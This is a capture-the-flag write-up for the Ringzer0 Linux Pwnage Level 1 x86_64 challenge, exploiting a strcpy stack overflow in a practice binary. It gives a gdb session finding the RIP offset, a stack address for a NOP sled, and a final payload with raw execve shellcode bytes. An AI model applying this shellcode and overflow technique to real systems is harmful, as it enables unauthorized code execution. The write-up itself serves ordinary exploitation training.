# Ringzer0 Linux Pwnage Level 1 x86_64 solution
Okay so analysing the binary, we see that it is using a vulnerable strcpy function
It is taking our  input and returning it back to us.

At the start, it looks like it is checking if the number of arguments passed is greater than one and it is using that register, so my guess is that it is taking argument from the command line. Indeed that matches with the functionality of our program.

## Proof of Concept
Now let's try and use this disassembled shellcode to guess what the size of the input needed to overflow the buffer is

After some trial and error, we are able to overwrite the RIP with the following input
```text
x64_user@lxc-pwn-x86-64:/Challenges$ gdb -q level1
Reading symbols from level1...(no debugging symbols found)...done.
(gdb) r $(python -c 'print "A"*1032 + "BBBBBB"')
Starting program: /Challenges/level1 $(python -c 'print "A"*1032 + "BBBBBB"')
Your buffer is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x0000424242424242 in ?? ()
```

## Completed Exploit
Cool, now that we have RIP, let's move forward. Also keep in mind that because its an x86_64 system, the addresses are 6 bytes and not 8 bytes.

Now let's set a breakpoint and then locate a NOP sled
We found a usable address
```text
(gdb) b *0x00000000004005a6
Breakpoint 1 at 0x4005a6

(gdb) x/200wx $rbp

0x7fffffffecb0:
```

Now we can use this address in our payload. Note that I have done this structure
NOP Sled + Payload. Since I don't want to scroll through something impossible to find the payload, I just want to be able to hit a random point in the NOPSled and it will carry the RIP through to the payload. 

The final payload is
```text
./level1 $(python -c 'print "\x90"*1005 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\xb0\xec\xff\xff\xff\x7f"')
```

Note that I have used a different payload from my usual /bin/dash because I had to search up something that was x86_64 compatible

